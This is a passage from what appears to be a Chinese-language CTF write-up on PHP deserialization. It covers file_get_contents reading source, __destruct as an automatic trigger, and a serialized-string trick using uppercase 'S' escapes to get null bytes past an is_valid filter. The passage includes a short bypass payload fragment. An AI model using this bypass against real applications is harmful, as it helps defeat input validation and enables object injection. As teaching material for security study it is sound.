-<li><strong><code>file_get_contents</code> 读的是源码</strong>：想拿 PHP 文件的原文用它，不是 include。</li>
-<li><strong><code>__destruct</code> 是最好用的触发器</strong>：对象没人接住也会在脚本结束时析构，<code>unserialize</code> 完什么都不用做。</li>
-</ul>
-<div class="admonition note">
-<p class="admonition-title">进阶：真要写 protected 形式的话</p>
-<p><code>is_valid</code> 拦空字节，但 PHP 反序列化支持<strong>大写 <code>S</code></strong> 的转义字符串，<code>\00</code> 在原文里是 3 个可打印字符（<code>\</code>、<code>0</code>、<code>0</code>，全在 32~125 之间），unserialize 时才还原成空字节：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>S:5:"\00*\00op";i:2;
-</span></code></pre></div>
-<p>这一招专门用于绕过"禁止空字节"的过滤器，记进反序列化专题。</p>
-</div>
     
     
   </div>
